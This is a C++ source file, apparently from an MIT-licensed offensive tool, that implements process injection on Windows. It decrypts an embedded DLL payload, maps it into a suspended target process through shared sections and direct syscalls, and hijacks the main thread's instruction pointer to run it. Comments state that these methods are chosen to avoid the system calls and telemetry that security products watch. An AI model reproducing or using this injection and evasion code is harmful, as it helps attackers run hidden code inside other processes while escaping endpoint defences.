// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "injector.hpp"
#include "../crypto/crypto.hpp"
#include "../sys/internal_api.hpp"
#include "../../build/payload_data.hpp"
#include <sstream>
#include <TlHelp32.h>

#ifndef SEC_COMMIT
#define SEC_COMMIT 0x8000000
#endif
#ifndef ViewShare
#define ViewShare 1
#endif

namespace Injector {

    PayloadInjector::PayloadInjector(ProcessManager& process, const Core::Console& console)
        : m_process(process), m_console(console) {}

    void PayloadInjector::Inject(const std::wstring& pipeName) {
        LoadAndDecryptPayload();

        DWORD offset = GetExportOffset("Bootstrap");
        if (offset == 0) throw std::runtime_error("Bootstrap export not found");

        SIZE_T payloadSize   = m_payload.size();
        SIZE_T pipeNameSize  = (pipeName.length() + 1) * sizeof(wchar_t);
        SIZE_T totalSize     = payloadSize + pipeNameSize;

        // ── Section-based injection (replaces NtAllocateVirtualMemory + NtWriteVirtualMemory) ──
        // Create a shared section, map locally to write the payload, then map into target process.
        // NtWriteVirtualMemory never called — avoids the most-watched injection syscall.
        HANDLE hSection = nullptr;
        LARGE_INTEGER sectionSize = {};
        sectionSize.QuadPart = static_cast<LONGLONG>(totalSize);

        NTSTATUS status = NtCreateSection_syscall(
            &hSection, 0xF001F /*SECTION_ALL_ACCESS*/, nullptr,
            &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr);
        if (!NT_SUCCESS(status)) throw std::runtime_error("NtCreateSection failed");

        // Map locally (writable) to copy payload + pipe name
        PVOID localBase = nullptr;
        SIZE_T viewSize = totalSize;
        status = NtMapViewOfSection_syscall(
            hSection, GetCurrentProcess(), &localBase,
            0, 0, nullptr, &viewSize, ViewShare, 0, PAGE_READWRITE);
        if (!NT_SUCCESS(status)) { NtClose_syscall(hSection); throw std::runtime_error("Local map failed"); }

        memcpy(localBase, m_payload.data(), payloadSize);
        memcpy(reinterpret_cast<uint8_t*>(localBase) + payloadSize,
               pipeName.c_str(), pipeNameSize);

        NtUnmapViewOfSection_syscall(GetCurrentProcess(), localBase);

        // Map into target process (executable, no write)
        PVOID remoteBase = nullptr;
        viewSize = totalSize;
        status = NtMapViewOfSection_syscall(
            hSection, m_process.GetProcessHandle(), &remoteBase,
            0, 0, nullptr, &viewSize, ViewShare, 0, PAGE_EXECUTE_READ);
        NtClose_syscall(hSection);
        if (!NT_SUCCESS(status)) throw std::runtime_error("Remote map failed");

        PVOID remotePipeName = reinterpret_cast<uint8_t*>(remoteBase) + payloadSize;
        uintptr_t entry      = reinterpret_cast<uintptr_t>(remoteBase) + offset;

        // ── Thread hijacking (replaces NtCreateThreadEx) ──
        // Find the main thread of the suspended target process and overwrite its RIP.
        // No new thread is created — no NtCreateThreadEx telemetry.
        DWORD targetPid = GetProcessId(m_process.GetProcessHandle());
        HANDLE hThread  = nullptr;

        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            THREADENTRY32 te = { sizeof(te) };
            if (Thread32First(snap, &te)) {
                do {
                    if (te.th32OwnerProcessID == targetPid) {
                        hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                        break;
                    }
                } while (Thread32Next(snap, &te));
            }
            CloseHandle(snap);
        }
        if (!hThread) throw std::runtime_error("Target thread not found");

        // Thread is already suspended (CREATE_SUSPENDED) — overwrite context
        CONTEXT ctx = {};
        ctx.ContextFlags = CONTEXT_FULL;
        status = NtGetContextThread_syscall(hThread, &ctx);
        if (!NT_SUCCESS(status)) { CloseHandle(hThread); throw std::runtime_error("GetContext failed"); }

#if defined(_M_X64)
        ctx.Rip = entry;
        ctx.Rcx = reinterpret_cast<ULONG64>(remotePipeName);
#elif defined(_M_ARM64)
        ctx.Pc  = entry;
        ctx.X0  = reinterpret_cast<ULONG64>(remotePipeName);
#endif

        status = NtSetContextThread_syscall(hThread, &ctx);
        if (!NT_SUCCESS(status)) { CloseHandle(hThread); throw std::runtime_error("SetContext failed"); }

        NtFlushInstructionCache_syscall(m_process.GetProcessHandle(), remoteBase, (ULONG)totalSize);
        NtResumeThread_syscall(hThread, nullptr);
        CloseHandle(hThread);
    }

    void PayloadInjector::LoadAndDecryptPayload() {
        static_assert(Payload::Embedded::Size > 0, "Embedded payload is empty");

        m_payload.assign(
            Payload::Embedded::Data,
            Payload::Embedded::Data + Payload::Embedded::Size
        );

        // Use runtime-derived keys (no static keys in binary)
        if (!Crypto::DecryptPayload(m_payload)) {
            throw std::runtime_error("Failed to derive decryption keys");
        }
    }

    DWORD PayloadInjector::GetExportOffset(const char* exportName) {
        auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(m_payload.data());
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return 0;

        auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(m_payload.data() + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return 0;

        auto exportDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (exportDirRva == 0) return 0;

        auto RvaToPtr = [&](DWORD rva) -> void* {
            auto section = IMAGE_FIRST_SECTION(ntHeaders);
            for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++section) {
                if (rva >= section->VirtualAddress && rva < section->VirtualAddress + section->Misc.VirtualSize) {
                    return m_payload.data() + section->PointerToRawData + (rva - section->VirtualAddress);
                }
            }
            return nullptr;
        };

        auto exportDir = (PIMAGE_EXPORT_DIRECTORY)RvaToPtr(exportDirRva);
        if (!exportDir) return 0;

        auto names = (DWORD*)RvaToPtr(exportDir->AddressOfNames);
        auto ordinals = (WORD*)RvaToPtr(exportDir->AddressOfNameOrdinals);
        auto funcs = (DWORD*)RvaToPtr(exportDir->AddressOfFunctions);

        if (!names || !ordinals || !funcs) return 0;

        for (DWORD i = 0; i < exportDir->NumberOfNames; ++i) {
            char* name = (char*)RvaToPtr(names[i]);
            if (name && strcmp(name, exportName) == 0) {
                void* funcPtr = RvaToPtr(funcs[ordinals[i]]);
                if (!funcPtr) return 0;
                return (DWORD)((uintptr_t)funcPtr - (uintptr_t)m_payload.data());
            }
        }
        return 0;
    }

}
